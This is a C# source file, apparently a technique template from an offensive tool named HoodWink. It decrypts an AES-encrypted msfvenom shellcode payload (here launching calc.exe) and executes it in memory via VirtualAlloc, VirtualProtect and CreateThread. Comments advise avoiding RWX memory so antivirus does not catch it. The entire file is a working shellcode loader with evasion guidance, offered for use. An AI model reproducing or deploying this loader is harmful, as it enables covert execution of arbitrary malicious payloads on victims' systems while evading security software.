// NOT Compiled

using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace HoodWink.TechniqueSource
{
    class Inline_NewThread
    {
        // to allocate mem
        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

        // to run delegate as unmanaged code
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate void WindowsRun();

        public static void Main(string[] args)
        {
            // x86_64 Payload
            // msfvenom -p windows/x64/exec -f csharp CMD=calc.exe
            string b64 = "8pbPlFh89PFz1xQcF5tKm7t+cSlKek3xG6vbswhHg7UJrGAtnsYme3pkzYKzwWbKBqikkF5/KDFqoVrl7Fz1aqFinAo4nQkIF+FV20CYrWyFr0FKYQOH44/7cIdtnrrDeidS0lWZJwVFeNF6naDG5h/e+OhOxvxKerKM56tkVoU18bkELkvINWh5CuJVlAMW0F+Rf+vIWLoZO3E8M3vcnWgf1KGGp48RhOIvaeGZLvaCq/QzaC04k9IaCyyqgGo3cRtCnJbmL/H6l1YPbDqhmG5ZWbVEGmKwHs0Ql1WlKJ+Dq1TrwRn1CCG6IHAkOtqA8Ny88rHbhFjgivr7KhYCsbosTUyPu+yJrZLppyKaapfGr0OvXFqIRZEVGgz8NARd";
            string key = "VgHZH0JtkuHTKGXTPltbRKkGpcQQabiCBPxoe52c3lw=";
            string iv = "sQXjxWMcMlCWNXqtJxc2Rw==";

            byte[] payload = Decrypt(b64, key, iv);

            // inptr.zero unless you care abour where it gets allocated
            // try to avoid assigning permissions of RWX, AV may catch that
            var basAddress = Native.Kernel32.VirtualAlloc(IntPtr.Zero,
                payload.Length,
                Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
                Native.Kernel32.MemoryProtection.ReadWrite);

            // could use this
            // Native.Kernel32.WriteProcessMemory
            // but this is a shortcut
            Marshal.Copy(payload, 0, basAddress, payload.Length);

            Native.Kernel32.VirtualProtect(basAddress, payload.Length, Native.Kernel32.MemoryProtection.ExecuteRead, out _);

            Native.Kernel32.CreateThread(IntPtr.Zero, 0, basAddress, IntPtr.Zero, 0, out var threadId);

            //Console.WriteLine((threadId != IntPtr.Zero) ? "[+] Success" : "[!] Failure");

        }


        private static byte[] Decrypt(string dataBase64, string keyBase64, string ivBase64)
        {
            using (Aes aes = Aes.Create())
            {
                // Decode data
                byte[] data = Convert.FromBase64String(dataBase64);

                // Set Key and IV
                aes.Key = Convert.FromBase64String(keyBase64);
                aes.IV = Convert.FromBase64String(ivBase64);

                // Console.WriteLine($"Aes Cipher Mode : {aes.Mode}");
                // Console.WriteLine($"Aes Padding Mode: {aes.Padding}");
                // Console.WriteLine($"Aes Key Size :    {aes.KeySize}");
                // Console.WriteLine($"Aes Block Size :  {aes.BlockSize}");
                // Console.WriteLine();

                // Create decrypter and run
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return DoCrypto(data, decryptor);
                }
            }
        }

        // Do Encryption/Decryption on data with provided crypter
        private static byte[] DoCrypto(byte[] data, ICryptoTransform crypter)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, crypter, CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();

                    return ms.ToArray();
                }
            }
        }

    }
}